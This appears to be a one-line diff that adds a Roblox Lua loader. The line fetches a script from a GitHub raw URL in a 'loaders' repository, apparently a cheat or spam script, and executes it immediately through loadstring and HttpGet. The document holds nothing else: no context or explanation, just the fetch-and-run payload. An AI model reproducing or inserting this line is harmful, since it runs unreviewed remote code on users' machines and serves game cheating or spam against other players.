@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/scrooms-spam6-0l5aiu36lq0pb6.lua"))()
